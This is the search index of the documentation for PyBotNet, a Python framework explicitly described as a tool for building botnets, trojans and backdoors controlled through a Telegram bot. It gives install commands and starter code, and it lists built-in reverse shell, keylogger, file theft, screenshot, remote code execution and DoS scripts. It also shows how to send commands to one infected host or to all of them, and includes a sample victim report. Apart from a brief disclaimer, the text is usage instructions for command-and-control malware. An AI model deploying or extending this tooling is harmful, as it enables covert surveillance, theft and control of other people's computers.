{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"PyBotNet A Python framework for building remote control , botnet , trojan or backdoor with Telegram or other control panels Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf!. Source Code : https://github.com/onionj/pybotnet Documentation : https://onionj.github.io/pybotnet/ Features: \u00b6 Built in Telegram control pannel and proxy Built in scripts like: reverse shell put or get file run python code on target systems get screenshot keylogger dos scheduler ... Cross platform Ability to easily add custom scripts Import external scripts Ability to add custom control panel Add remote control to your apps ... Go to the next page to create the first remote control :)","title":"About"},{"location":"#features","text":"Built in Telegram control pannel and proxy Built in scripts like: reverse shell put or get file run python code on target systems get screenshot keylogger dos scheduler ... Cross platform Ability to easily add custom scripts Import external scripts Ability to add custom control panel Add remote control to your apps ... Go to the next page to create the first remote control :)","title":"Features:"},{"location":"tutorial_advanced_guide/tutorial_advanced_guide_intro/","text":"comming soon..","title":"Tutorial advanced guide intro"},{"location":"tutorial_user_guide/add_custom_script/","text":"Add custom scripts \u00b6 in some case you need to add your own custom scripts The simplest PyBotNet custom script could look like this: main.py from pybotnet import BotNet , Context , TelegramEngine # (4) telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) # new: @botnet . add_script ( script_version = \"0.1.0\" ) # (3) def ping ( context : Context ): # (5) \"\"\"`/ping`\"\"\" return f \"pong { ' ' . join ( context . command ) } \" # (6) botnet . run () create engine: Engines transfer messages between admin and botnet create BotNet instance create new custom script we import Context to recive requests and system data get context get admin command from context In the code above, we added a script that returns pong <message> for us when we execute the \\ping <message> comment. As you see. We used a decorator to add our script to the botnet instance, now if we execute the code we have access to the ping script in the control panel. Scripts can also contain Context parameters, which include the engine itself, system data, commands sent by the user, and so on.","title":"Add custom script"},{"location":"tutorial_user_guide/add_custom_script/#add-custom-scripts","text":"in some case you need to add your own custom scripts The simplest PyBotNet custom script could look like this: main.py from pybotnet import BotNet , Context , TelegramEngine # (4) telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) # new: @botnet . add_script ( script_version = \"0.1.0\" ) # (3) def ping ( context : Context ): # (5) \"\"\"`/ping`\"\"\" return f \"pong { ' ' . join ( context . command ) } \" # (6) botnet . run () create engine: Engines transfer messages between admin and botnet create BotNet instance create new custom script we import Context to recive requests and system data get context get admin command from context In the code above, we added a script that returns pong <message> for us when we execute the \\ping <message> comment. As you see. We used a decorator to add our script to the botnet instance, now if we execute the code we have access to the ping script in the control panel. Scripts can also contain Context parameters, which include the engine itself, system data, commands sent by the user, and so on.","title":"Add custom scripts"},{"location":"tutorial_user_guide/first_step/","text":"Install PyBotNet \u00b6 pip3 install pybotnet -U --pre Note Currently version 2 of the PyBotNet is pre-release --pre : Include pre-release and development versions. By default, pip only finds stable versions. -U : make sure to upgrade framework to latest version. The simplest PyBotNet file could look like this: \u00b6 main.py from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) botnet . run () create engine: Engines transfer messages between admin and botnet create BotNet instance Note TELEGRAM_TOKEN : Get it from the telegram @botfather ADMIN_CHAT_ID : Get it from @userinfobot this code include default scripts, like: shell , put_file , get_file , screenshot , who , ... Run code: \u00b6 python3 main.py telegram engine \u00b6 open telegram and send /who to your bot; If you have done the steps correctly, you recive message like this: scripts_name: echo who shell screenshot put_file get_file runcode openurl dos schedule mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name local_ip: {'192.168.23.1'} host_name: {'system_name'} system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8 pybotnet_version: 2.0.8b0 from cache: True you can send /help to see help page, or send /help <script_name> to recive more help about script. for example send /help screenshot , You will receive: NAME: screenshot DESCRIPTION: get screen shot * `[mac-address] /screenshot` or * `/screenshot` example command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-download-link script_version: 0.0.1 default_script: True ___________________________ scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule'] mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name use_proxy: False in top of message you see script name, description, syntax and examples. for run screenshot script you have two choice: Run the script on all clients that are listening to Telegram bot (for now we have one!) Run script on one system for run script on all client send /screenshot bot if you need get screen shot on specific system you need send [mac_addres] /screenshot for our case: 228362405364 /screenshot in some case like /shell you need to run it just for one system","title":"First step"},{"location":"tutorial_user_guide/first_step/#install-pybotnet","text":"pip3 install pybotnet -U --pre Note Currently version 2 of the PyBotNet is pre-release --pre : Include pre-release and development versions. By default, pip only finds stable versions. -U : make sure to upgrade framework to latest version.","title":"Install PyBotNet"},{"location":"tutorial_user_guide/first_step/#the-simplest-pybotnet-file-could-look-like-this","text":"main.py from pybotnet import BotNet , TelegramEngine telegram_engine = TelegramEngine ( token = TELEGRAM_TOKEN , admin_chat_id = ADMIN_CHAT_ID ) #(1) botnet = BotNet ( telegram_engine ) # (2) botnet . run () create engine: Engines transfer messages between admin and botnet create BotNet instance Note TELEGRAM_TOKEN : Get it from the telegram @botfather ADMIN_CHAT_ID : Get it from @userinfobot this code include default scripts, like: shell , put_file , get_file , screenshot , who , ...","title":"The simplest PyBotNet file could look like this:"},{"location":"tutorial_user_guide/first_step/#run-code","text":"python3 main.py","title":"Run code:"},{"location":"tutorial_user_guide/first_step/#telegram-engine","text":"open telegram and send /who to your bot; If you have done the steps correctly, you recive message like this: scripts_name: echo who shell screenshot put_file get_file runcode openurl dos schedule mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name local_ip: {'192.168.23.1'} host_name: {'system_name'} system_user: root up_time: 0:00:01 current_route: / pid: 148352 cpu_count: 8 pybotnet_version: 2.0.8b0 from cache: True you can send /help to see help page, or send /help <script_name> to recive more help about script. for example send /help screenshot , You will receive: NAME: screenshot DESCRIPTION: get screen shot * `[mac-address] /screenshot` or * `/screenshot` example command: * `94945035671481 /screenshot` * `/screenshot` return: img or img-download-link script_version: 0.0.1 default_script: True ___________________________ scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule'] mac_addres: 228362405364 os: Linux global_ip: 5.10.30.35 country: Iran, Islamic Republic of bot_name: no_name use_proxy: False in top of message you see script name, description, syntax and examples. for run screenshot script you have two choice: Run the script on all clients that are listening to Telegram bot (for now we have one!) Run script on one system for run script on all client send /screenshot bot if you need get screen shot on specific system you need send [mac_addres] /screenshot for our case: 228362405364 /screenshot in some case like /shell you need to run it just for one system","title":"telegram engine"}]}